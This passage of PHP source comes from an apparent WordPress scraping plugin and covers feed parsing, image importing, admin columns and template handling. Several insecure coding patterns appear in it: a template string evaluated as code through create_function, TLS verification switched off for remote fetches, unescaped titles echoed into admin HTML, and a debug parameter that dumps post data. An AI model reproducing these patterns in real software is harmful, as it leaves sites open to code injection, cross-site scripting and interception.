				update_post_meta($insert_id, 'scrape_task_id', $insert_id);


			}
			wp_redirect(add_query_arg('post_type', 'scrape_lite', admin_url('/edit.php')));
			exit;
		}
	}

	public function remove_row_actions($actions, $post) {
		if ($post->post_type == 'scrape_lite') {
			unset($actions);
			return array(
				'' => ''
			);
		}
		return $actions;
	}

	public function add_status_column($columns) {
		unset($columns['title']);
		unset($columns['date']);

		$columns['name'] = __('Name', "ol-scrapes-lite");
		$columns['status'] = __('Status', "ol-scrapes-lite");
		$columns['schedules'] = __('Schedules', "ol-scrapes-lite");
		$columns['actions'] = __('Actions', "ol-scrapes-lite");
		if (isset($_GET['scrape_debug'])) {
			$columns['debug'] = 'Debug';
		}
		return $columns;
	}

	public function show_status_column($column_name, $post_ID) {
		clean_post_cache($post_ID);
		$post_status = get_post_status($post_ID);
		$post_title = get_post_field('post_title', $post_ID);
		$scrape_status = get_post_meta($post_ID, 'scrape_workstatus', true);
		$run_limit = get_post_meta($post_ID, 'scrape_run_limit', true);
		$run_count = get_post_meta($post_ID, 'scrape_run_count', true);
		$css_class = '';

		if ($post_status == 'trash') {
			$status = __("Deactivated", "ol-scrapes-lite");
			$css_class = "deactivated";
		} else if ($run_count == 0 && $scrape_status == 'waiting') {
			$status = __("Preparing", "ol-scrapes-lite");
			$css_class = "preparing";
		} else if (($run_count < $run_limit) && $scrape_status == 'waiting') {
			$status = __("Waiting next run", "ol-scrapes-lite");
			$css_class = "wait_next";
		} else if (((!empty($run_limit) && $run_count < $run_limit)) && $scrape_status == 'running') {
			$status = __("Running", "ol-scrapes-lite");
			$css_class = "running";
		} else if ($run_count == $run_limit && $scrape_status == 'waiting') {
			$status = __("Complete", "ol-scrapes-lite");
			$css_class = "complete";
		}

		if ($column_name == 'status') {
			echo "<span class='ol_status ol_status_$css_class'>" . $status . "</span>";
		}

		if ($column_name == 'name') {
			echo
			"<p><strong><a href='" . get_edit_post_link($post_ID) . "'>" . $post_title . "</a><strong></p>" .
			"<p><span class='id'>ID: " . $post_ID . "</span></p>";
		}

		if ($column_name == 'schedules') {
			$last_run = get_post_meta($post_ID, 'scrape_start_time', true) != "" ? get_post_meta($post_ID, 'scrape_start_time', true) : __("None", "ol-scrapes-lite");
			$last_complete = get_post_meta($post_ID, 'scrape_end_time', true) != "" ? get_post_meta($post_ID, 'scrape_end_time', true) : __("None", "ol-scrapes-lite");
			$run_count_progress = $run_count;

			$offset = get_option('gmt_offset') * 3600;
			$date = date("Y-m-d H:i:s", wp_next_scheduled("scrape_event_lite", array($post_ID)) + $offset);
			if (strpos($date, "1970-01-01") !== false) {
				$date = __("No Schedule", "ol-scrapes-lite");
			}
			echo
			"<p><label>".__("Last Run:" , "ol-scrapes-lite") ."</label> <span>" . $last_run . "</span></p>" .
			"<p><label>".__("Last Complete:" , "ol-scrapes-lite") ."</label> <span>" . $last_complete . "</span></p>" .
			"<p><label>".__("Next Run:" , "ol-scrapes-lite") ."</label> <span>" . $date . "</span></p>" .
			"<p><label>".__("Total Run:" , "ol-scrapes-lite") ."</label> <span>" . $run_count_progress . "</span></p>";
		}
		if ($column_name == "actions") {
			$nonce = wp_create_nonce('scrape_lite_custom_actions');
			$untrash = wp_create_nonce('untrash-post_' . $post_ID);
			echo
			($post_status != 'trash' ? "<a href='" . get_edit_post_link($post_ID) . "' class='button edit'><i class='icon ion-android-create'></i>" . __("Edit", "ol-scrapes-lite") . "</a>" : "" ) .
			($post_status != 'trash' ? "<a href='" . admin_url("edit.php?post_type=scrape_lite&scrape_id=$post_ID&_wpnonce=$nonce&scrape_action=start_scrape") . "' class='button run ol_status_" . $css_class . "'><i class='icon ion-play'></i>" . __("Run", "ol-scrapes-lite") . "</a>" : "") .
			($post_status != 'trash' ? "<a href='" . admin_url("edit.php?post_type=scrape_lite&scrape_id=$post_ID&_wpnonce=$nonce&scrape_action=stop_scrape") . "' class='button stop ol_status_" . $css_class . "'><i class='icon ion-pause'></i>" . __("Pause", "ol-scrapes-lite") . "</a>" : "") .
			($post_status != 'trash' ? "<br><a href='" . admin_url("edit.php?post_type=scrape_lite&scrape_id=$post_ID&_wpnonce=$nonce&scrape_action=duplicate_scrape") . "' class='button duplicate'><i class='icon ion-android-add-circle'></i>" . __("Copy", "ol-scrapes-lite") . "</a>" : "" ) .
			($post_status != 'trash' ? "<a href='" . get_delete_post_link($post_ID) . "' class='button trash'><i class='icon ion-trash-b'></i>" . __("Trash", "ol-scrapes-lite") . "</a>" :
				"<a href='" . admin_url('post.php?post=' . $post_ID . '&action=untrash&_wpnonce=' . $untrash) . "' class='button restore'><i class='icon ion-forward'></i>" . __("Restore", "ol-scrapes-lite") . "</a>");
		}

		if ($column_name == "debug") {
			echo var_export(get_post_meta($post_ID));
			echo var_export(get_post($post_ID));
		}
	}

	public function convert_readable_html($html_string) {

		require_once "class-readability.php";

		$readability = new OL_Lite_Readability($html_string);
		$readability->debug = false;
		$readability->convertLinksToFootnotes = false;
		$result = $readability->init();
		if ($result) {
			$content = $readability->getContent()->innerHTML;
			if (function_exists('tidy_parse_string')) {
				$tidy = tidy_parse_string($content, array('indent' => true, 'show-body-only' => true), 'UTF8');
				$tidy->cleanRepair();
				$content = $tidy->value;
			}
			return $content;
		} else {
			return '';
		}
	}

	public function feed_scrape($url, $meta_vals, $start_time, $modify_time, $task_id) {

		$number_of_posts = 0;
		$repeat_count = 0;

		$args = array(
			'timeout' => $meta_vals['scrape_timeout'][0],
			'sslverify' => false,
			'user-agent' => get_option('scrape_user_agent_lite')
		);
		$response = wp_remote_get($url, $args);

		if (!isset($response->errors)) {
			libxml_use_internal_errors(true);
			$body = $response['body'];
			$charset = $this->detect_feed_encoding_and_replace(wp_remote_retrieve_header($response, "Content-Type"), $body);
			$body = iconv($charset, "UTF-8//IGNORE", $body);

			$xml = simplexml_load_string($body);
			if ($xml === false) {

				libxml_clear_errors();
			}

			$namespaces = $xml->getNamespaces(true);

			$feed_type = $xml->getName();

			$ID = 0;

			$feed_image = '';
			if ($feed_type == 'rss') {
				$items = $xml->channel->item;
				if (isset($xml->channel->image)) {
					$feed_image = $xml->channel->image->url;
				}
			} else if ($feed_type == 'feed') {
				$items = $xml->entry;
				$feed_image = (!empty($xml->logo) ? $xml->logo : $xml->icon);
			} else if ($feed_type == 'RDF') {
				$items = $xml->item;
				$feed_image = $xml->channel->image->attributes($namespaces['rdf'])->resource;
			}

			foreach ($items as $item) {

                if ($this->check_terminate($start_time, $modify_time, $task_id)) {
                    return "terminate";
                }


                $post_date = '';
                if ($feed_type == 'rss') {
                    $post_date = $item->pubDate;
                } else if ($feed_type == 'feed') {
                    $post_date = $item->published;
                } else if ($feed_type == 'RDF') {
                    $post_date = $item->children($namespaces['dc'])->date;
                }

                $post_date = date('Y-m-d H:i:s', strtotime($post_date));

                if ($feed_type != 'feed') {
                    $post_content = html_entity_decode($item->description);
                    $original_html_content = $post_content;
                } else {
                    $post_content = html_entity_decode($item->content);
                    $original_html_content = $post_content;
                }

                if ($meta_vals['scrape_allowhtml'][0] != 'on') {
                    $post_content = wp_strip_all_tags($post_content);
                }

                $post_content = trim($post_content);

                $mime_types = get_allowed_mime_types();
                if (isset($namespaces['media'])) {
                    $media = $item->children($namespaces['media']);
                } else {
                    $media = $item->children();
                }

                if (isset($media->content) && $feed_type != 'feed') {

                    $type = (string) $media->content->attributes()->type;
                    $url = (string) $media->content->attributes()->url;
                    $featured_image_url = $url;
                } else if (isset($media->thumbnail)) {

                    $url = (string) $media->thumbnail->attributes()->url;
                    $featured_image_url = $url;
                } else if (isset($item->enclosure)) {

                    $type = (string) $item->enclosure['type'];
                    $url = (string) $item->enclosure['url'];
                    $featured_image_url = $url;
                } else if (
                    isset($item->description) ||
                    (isset($item->content) && $feed_type == 'feed')) {
                    $item_content = (isset($item->description) ? $item->description : $item->content);

                    $doc = new DOMDocument();
                    @$doc->loadHTML('<?xml encoding="utf-8" ?>' . html_entity_decode($item_content));

                    $imgs = $doc->getElementsByTagName('img');

                    if ($imgs->length) {
                        $featured_image_url = $imgs->item(0)->attributes->getNamedItem('src')->nodeValue;
                    }
                } else if (!empty($feed_image)) {

                    $featured_image_url = $feed_image;
                }

                $rss_item = array(
                    'post_date' => strval($post_date),
                    'post_content' => strval($post_content),
                    'post_original_content' => $original_html_content,
                    'featured_image' => strval($featured_image_url),
                    'post_title' => strval($item->title)
                );
                if ($feed_type == 'feed') {
                    $this->single_scrape(strval($item->link["href"]), $meta_vals, $repeat_count, $rss_item);
                } else {
                    $this->single_scrape(strval($item->link), $meta_vals, $repeat_count, $rss_item);
                }


                if (!empty($meta_vals['scrape_waitpage'][0]))
                    sleep($meta_vals['scrape_waitpage'][0]);
                $number_of_posts++;



                if (!empty($meta_vals['scrape_post_limit'][0]) && $number_of_posts == $meta_vals['scrape_post_limit'][0]) {

                    return;
                }

                if (!empty($meta_vals['scrape_finish_repeat']) && $repeat_count == $meta_vals['scrape_finish_repeat'][0]) {

                    return;
                }

			}
		} else {

			if ($meta_vals['scrape_onerror'][0] == 'stop') {

				return;
			}
		}
	}

	public function remove_publish() {
		add_action('admin_menu', array($this, 'remove_other_metaboxes'));
		add_filter('get_user_option_screen_layout_' . 'scrape_lite', array($this, 'screen_layout_post'));
	}

	public function remove_other_metaboxes() {
		remove_meta_box('submitdiv', 'scrape_lite', 'side');
		remove_meta_box('slugdiv', 'scrape_lite', 'normal');
		remove_meta_box('postcustom', 'scrape_lite', 'normal');
	}

	public function screen_layout_post() {
		add_filter('screen_options_show_screen', '__return_false');
		return 1;
	}

	public function convert_html_links($html_string, $base_url, $html_base_url) {
		if (empty($html_string)) {
			return "";
		}
		$doc = new DOMDocument();
		@$doc->loadHTML('<?xml encoding="utf-8" ?>' . $html_string);
		$imgs = $doc->getElementsByTagName('img');
		if ($imgs->length) {
			foreach ($imgs as $item) {
				$item->setAttribute('src', $this->create_absolute_url($item->getAttribute('src'), $base_url, $html_base_url));
			}
		}
		$a = $doc->getElementsByTagName('a');
		if ($a->length) {
			foreach ($a as $item) {
				$item->setAttribute('href', $this->create_absolute_url($item->getAttribute('href'), $base_url, $html_base_url));
			}
		}
		$doc->removeChild($doc->doctype);
		$doc->removeChild($doc->firstChild);
		$doc->replaceChild($doc->firstChild->firstChild->firstChild, $doc->firstChild);
		return $doc->saveHTML();
	}

	public function convert_str_to_woo_decimal($money) {
		$decimal_separator = stripslashes(get_option('woocommerce_price_decimal_sep'));
		$thousand_separator = stripslashes(get_option('woocommerce_price_thousand_sep'));

		$money = preg_replace("/[^\d\.,]/", '', $money);
		$money = str_replace($thousand_separator, '', $money);
		$money = str_replace($decimal_separator, '.', $money);
		return $money;
	}

	public function download_images_from_html_string($html_string, $post_id) {
		if (empty($html_string)) {
			return "";
		}
		$doc = new DOMDocument();
		@$doc->loadHTML('<?xml encoding="utf-8" ?><div>' . $html_string . '</div>');
		$imgs = $doc->getElementsByTagName('img');
		if ($imgs->length) {
			foreach ($imgs as $item) {

				$image_url = $item->getAttribute('src');

				global $wpdb;
				$query = "SELECT ID FROM {$wpdb->posts} WHERE post_title LIKE '" . md5($image_url) . "%' and post_type ='attachment' and post_parent = $post_id";
				$count = $wpdb->get_var($query);



				if (empty($count)) {
					$attach_id = $this->generate_featured_image($image_url, $post_id, false);
					$item->setAttribute('src', wp_get_attachment_url($attach_id));
                    $item->removeAttribute('srcset');
                    $item->removeAttribute('sizes');
				} else {
					$item->setAttribute('src', wp_get_attachment_url($count));
                    $item->removeAttribute('srcset');
                    $item->removeAttribute('sizes');
				}
				unset($image_url);
			}
		}
		$doc->removeChild($doc->doctype);
		$doc->removeChild($doc->firstChild);
		$doc->replaceChild($doc->firstChild->firstChild->firstChild, $doc->firstChild);
		$str = $doc->saveHTML();
		unset($doc);
		return $str;
	}

	public function register_shutdown() {
		add_action('shutdown', array($this, 'shutdown_callback'));
	}

	public function shutdown_callback() {
		if (version_compare(PHP_VERSION, '5.2.0', '>=')) {
			$error = error_get_last();
			if ($error['type'] === E_ERROR || $error['type'] === E_RECOVERABLE_ERROR) {

				if (self::$task_id) {
					$post_id = self::$task_id;
					$meta_vals = get_post_meta($post_id);
					update_post_meta($post_id, "scrape_run_count", $meta_vals['scrape_run_count'][0] + 1);
					update_post_meta($post_id, 'scrape_workstatus', 'waiting');
					update_post_meta($post_id, "scrape_end_time", current_time('mysql'));

				}
			}
		}
	}


	public function check_terminate($start_time, $modify_time, $post_id) {
		clean_post_cache($post_id);

		if ($start_time != get_post_meta($post_id, "scrape_start_time", true) &&
			get_post_meta($post_id, 'scrape_stillworking', true) == 'terminate') {

			return true;
		}

		if (get_post_status($post_id) == 'trash' || get_post_status($post_id) === false) {

			return true;
		}

		$check_modify_time = get_post_modified_time('U', null, $post_id);
		if ($modify_time != $check_modify_time && $check_modify_time !== false) {

			return true;
		}

		return false;
	}

	public function trimmed_templated_value($prefix, &$meta_vals, &$xpath, $post_date, $url, $meta_input, $rss_item = null) {
		$value = '';
		if (isset($meta_vals[$prefix]) || isset($meta_vals[$prefix . "_type"])) {
            if(isset($meta_vals[$prefix . "_type"]) && $meta_vals[$prefix . "_type"][0] == 'feed') {
                $value = $rss_item{'post_title'};
            } else {
                if(!empty($meta_vals[$prefix][0])) {
                    $node = $xpath->query($meta_vals[$prefix][0]);
                    if ($node->length) {
                        $value = $node->item(0)->nodeValue;


                    } else {
                        $value = '';

                    }
                } else {
                    $value = '';
                }
            }
		}
		if (isset($meta_vals[$prefix . '_template_status']) && !empty($meta_vals[$prefix . '_template_status'][0])) {
			$template = $meta_vals[$prefix . '_template'][0];

			$value = str_replace("[scrape_value]", $value, $template);
			$value = str_replace("[scrape_date]", $post_date, $value);
			$value = str_replace("[scrape_url]", $url, $value);

			preg_match_all('/\[scrape_meta name="([^"]*)"\]/', $value, $matches);

			$full_matches = $matches[0];
			$name_matches = $matches[1];
			if (!empty($full_matches)) {
				$combined = array_combine($name_matches, $full_matches);

				foreach ($combined as $meta_name => $template_string) {
					$val = $meta_input[$meta_name];
					$value = str_replace($template_string, $val, $value);
				}
			}

		}
		return trim($value);
	}

	public function translate_months($str) {
		$languages = array(
			"en" => array(
				"January",
				"February",
				"March",
				"April",
				"May",
				"June",
				"July",
				"August",
				"September",
				"October",
				"November",
				"December"
			),
			"de" => array(
				"Januar",
				"Februar",
				"März",
				"April",
				"Mai",
				"Juni",
				"Juli",
				"August",
				"September",
				"Oktober",
				"November",
				"Dezember"
			),
			"fr" => array(
				"Janvier",
				"Février",
				"Mars",
				"Avril",
				"Mai",
				"Juin",
				"Juillet",
				"Août",
				"Septembre",
				"Octobre",
				"Novembre",
				"Décembre"
			),
			"tr" => array(
				"Ocak",
				"Şubat",
				"Mart",
				"Nisan",
				"Mayıs",
				"Haziran",
				"Temmuz",
				"Ağustos",
				"Eylül",
				"Ekim",
				"Kasım",
				"Aralık"
			),
			"nl" => array(
				"Januari",
				"Februari",
				"Maart",
				"April",
				"Mei",
				"Juni",
				"Juli",
				"Augustus",
				"September",
				"Oktober",
				"November",
				"December"
			)
		);

		$languages_abbr = $languages;

		foreach ($languages_abbr as $locale => $months) {
			$languages_abbr[$locale] = array_map(array($this, 'month_abbr'), $months);
		}

		foreach ($languages as $locale => $months) {
			$str = str_ireplace($months, $languages["en"], $str);
		}
		foreach ($languages_abbr as $locale => $months) {
			$str = str_ireplace($months, $languages_abbr["en"], $str);
		}

		return $str;
	}

	public static function month_abbr($month) {
		return mb_substr($month, 0, 3);
	}

	public function template_calculator($str) {

        $fn = create_function("", "return ({$str});" );
        return $fn !== false ? $fn() : "";
    }



}
